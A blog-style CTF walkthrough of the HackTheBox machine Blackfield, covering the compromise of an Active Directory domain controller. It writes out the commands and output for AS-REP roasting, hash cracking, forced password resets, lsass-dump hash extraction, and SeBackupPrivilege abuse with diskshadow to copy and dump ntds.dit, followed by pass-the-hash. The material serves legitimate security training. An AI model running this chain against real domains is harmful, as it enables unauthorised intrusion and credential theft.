---
categories:
- CTF
layout: post
image:
  path: preview.png
media_subpath: /assets/posts/2025-07-18-blackfield-hackthebox
tags:
- hackthebox
- windows
- smb
- acl
- winrm

title: blackfield @ HackTheBox
---
blackfield is an hard-difficulty machine on [hackthebox.eu](https://www.hackthebox.eu). 
Initial access is gained by accessing a guest smb share, we find a list of usernames, using these usernames, we find a asrep-roastable user. Cracking their hash, we find that their user has forceChangePassword over audit2020. Using this user, we find a new share named forensic, looking through the zip files, a lsass.zip file can be found. Using pypykatz, we reveal a NT hash for the svc_backup user. Connecting over win-rm, we can perform a SeBackupPrivilege attack which gains us root.

## User & Root Flag
This post is a walkthrough for blackfield, a hard machine on [hackthebox.eu](https://www.hackthebox.eu). 
The initial scan (`nmap -Pn -n -sC -sV -p- 10.129.162.184`) shows the following results:
```
Nmap scan report for 10.129.162.184
Host is up (0.016s latency).
Not shown: 992 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-18 06:41:14Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-07-18T06:41:20
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m58s
```

## User
No intial creds were given, so we begin with enumerating SMB as guest.
Running smbmap with the guest user, we find that we have access to a share called `profiles`.
```
┌──(tsunami㉿coffee)-[~]
└─$ smbmap -u 'guest' -p '' -H 10.129.162.184         

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.162.184:445      Name: BLACKFIELD.local          Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                NO ACCESS       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        profiles$                                               READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
[*] Closed 1 connections 
```

Using smbclient, we connect to that share and find a list of usernames.
![capture-0](capture-0.PNG)
We can use these usernames to enumerate potential usernames on the domain controller
(an easier way is using kerbrute, but for the sake of learning I'm doing the intended method)
![capture-1](capture-1.PNG)
With a list of known usernames, we can perform a asrep-roast attack.
Putting all the usernames into a file, using `impacket-GetNPUsers`, we can perform a asrep-attack.
```
impacket-GetNPUsers -usersfile usernames.txt -dc-ip 10.129.162.184 'blackfield.local/'
```
Eventually, we find a roastable user `support`
![capture-2](capture-2.PNG)
```
$krb5asrep$23$support@BLACKFIELD.LOCAL:661cf18c9c8fc5c29575776b4d5079a2$033c241eb0f356695f815dbb25bedf2418fc832152860f092b26f245764ea72502093b4931e2fbf9af627f4f407ad84759d39e3167f328ec5efaabb51b99bf6534b1e35132bce9f670defeb18ceddc0a97fcdef9ec7d44b1ec1e33b58eaaa8f02ebbd4e06d0e40d570cae5c17618377b06805057266ececa36afd7ea01677e77b92eccf4632a6691fab62f438fa28b0b39f49d20d684b6efd80bef93092664c6fdafdbde47584b5bbe321708ed52abd8acfa0fbaa87e65e7e5a0def1c3e88bea62f8d5bb8b470ef091c8690b5fdd170637f923a612f0cbd87efaa0a80708a9a25189df96a1d6c8178b911f5aa58de170f6b5c665
```

Cracking the hash with hashcat, we find the password for the user.
![capture-3](capture-3.PNG)
```
hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
<snip>
support:#00^BlackKnight
```

## Support
Using our new creds, we enumerate SMB again and find we have access to the `forensic` share.
![capture-4](capture-4.PNG)
However, trying to access this share turns out that we `don't` have access to it..
```
┌──(tsunami㉿coffee)-[~/Documents/blackfield/bloodhound]
└─$ smbclient //10.129.162.184/forensic -U "blackfield.local//support%#00^BlackKnight"
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \> 
```
Using bloodhound, we find that we are able to `forceChangePassword` over the `audit2020` account.
![capture-5](capture-5.PNG)
This resource is omega helpful: https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword <br>
```
┌──(tsunami㉿coffee)-[~/Documents/blackfield/bloodhound]
└─$ bloodyAD --host "10.129.162.184" -d "blackfield.local" -u "support" -p "#00^BlackKnight" set password "audit2020" "P@SSW0RD1xd"
[+] Password changed successfully!
```
Accessing the forensic share again, checking `memory_analysis` we find a lsass.zip
```
┌──(tsunami㉿coffee)-[~/Documents/blackfield/forensic]
└─$ smbclient //10.129.162.184/forensic -U "blackfield.local//audit2020%P@SSW0RD1xd"

smb: \memory_analysis\> ls
  .                                   D        0  Thu May 28 21:28:33 2020
  ..                                  D        0  Thu May 28 21:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 21:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 21:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 21:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 21:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 21:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 21:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 21:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 21:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 21:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 21:27:00 2020
  smartscreen.zip                     A 33756344  Thu May 28 21:27:11 2020
  svchost.zip                         A 14408833  Thu May 28 21:27:19 2020
  taskhostw.zip                       A 34631412  Thu May 28 21:27:30 2020
  winlogon.zip                        A 14255089  Thu May 28 21:27:38 2020
  wlms.zip                            A  4067425  Thu May 28 21:27:44 2020
  WmiPrvSE.zip                        A 18303252  Thu May 28 21:27:53 2020

                5102079 blocks of size 4096. 1693230 blocks available
smb: \memory_analysis\> get lsass.zip
getting file \memory_analysis\lsass.zip of size 41936098 as lsass.zip (17360.4 KiloBytes/sec) (average 17360.4 KiloBytes/sec)
```

Grabbing this file and inspecting it, we find that its a lsass.dmp file.
![capture-9](capture-9.PNG)
Looking through with sublime, some users have a NT hash.
eventually, we find a administrator and svc_backup NT hash.
the administrator hash did not work, so we use the svc_backup and we are able to connect via win-rm.
```
svc_backup : 9658d1d1dcd9250115e2205d9f48400d 

.....

┌──(tsunami㉿coffee)-[~/Documents/blackfield/forensic]
└─$ nxc winrm -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d' -d 'blackfield.local' 10.129.147.254                
WINRM       10.129.147.254  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
WINRM       10.129.147.254  5985   DC01             [+] blackfield.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
```

## svc_backup
![capture-12](capture-12.PNG)
Connecting via win-rm, we find a note in the `C:\` drive.
```
*Evil-WinRM* PS C:\> type notes.txt
Mates,

After the domain compromise and computer forensic last week, auditors advised us to:
- change every passwords -- Done.
- change krbtgt password twice -- Done.
- disable auditor's account (audit2020) -- KO.
- use nominative domain admin accounts instead of this one -- KO.

We will probably have to backup & restore things later.
- Mike.

PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
```
This hints towards a backup-styled attack, checking our privileges, this confirms that.
![capture-13](capture-13.PNG)
We can create a .dsh file to create and expose a drive which holds the backup.
First, create the .dsh file on your Linux machine.
```
set context persistent nowriters
add volume c: alias blackfield
create
expose %blackfield% z:
```
Then use unix2dos on it.
```
┌──(tsunami㉿coffee)-[~/Documents/blackfield]
└─$ unix2dos black.dsh 
unix2dos: converting file black.dsh to DOS format...
```

Transfer it over via win-rm, and use diskshadow to create a shadow copy.
```
*Evil-WinRM* PS C:\Temp> diskshadow /s black.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  7/20/2025 9:07:36 PM

-> set context persistent nowriters
-> add volume c: alias blackfield
-> create
Alias blackfield for shadow ID {233bec9a-24ea-4fa1-8898-6f9e68099ddd} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {33bc04d4-5fa1-4204-a596-596c945c2b53} set as environment variable.

Querying all shadow copies with the shadow copy set ID {33bc04d4-5fa1-4204-a596-596c945c2b53}

        * Shadow copy ID = {233bec9a-24ea-4fa1-8898-6f9e68099ddd}               %blackfield%
                - Shadow copy set: {33bc04d4-5fa1-4204-a596-596c945c2b53}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 7/20/2025 9:07:37 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %blackfield% z:
-> %blackfield% = {233bec9a-24ea-4fa1-8898-6f9e68099ddd}
The shadow copy was successfully exposed as z:\.
->
```
![capture-15](capture-15.PNG)

Once the backup is complete use robocopy to copy the ntds.dit file over.
```
*Evil-WinRM* PS C:\Temp> robocopy /b z:/windows/ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Sunday, July 20, 2025 9:16:05 PM
   Source : z:\windows\ntds\
     Dest : C:\Temp\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    z:\windows\ntds\
            New File              18.0 m        ntds.dit
  0.0%
  0.3%
  0.6%
  1.0%
  1.3%
  1.7%
  <SNIP>
```
![capture-16](capture-16.PNG)

Next, we need to save the system file in order to complete everything.
```
*Evil-WinRM* PS C:\Temp> reg save hklm\system system
The operation completed successfully.
```
With both the ntds and system file saved, we have to download them to our local machine.
```
*Evil-WinRM* PS C:\Temp> download ntds.dit
                                        
Info: Downloading C:\Temp\ntds.dit to ntds.dit
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Temp> download system
                                        
Info: Downloading C:\Temp\system to system
```

## Root
With both ntds.dit and system saved to your Linux machine, use impackets secretsdump to obtain the administrator hash.
```
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```
![capture-20](capture-20.PNG)
Use evil-winrm to obtain your root flag.
```
evil-winrm -u 'administrator' -H '184fb5e5178480be64824d4cd53b99ee'  -i 10.129.147.254
```
![capture-21](capture-21.PNG)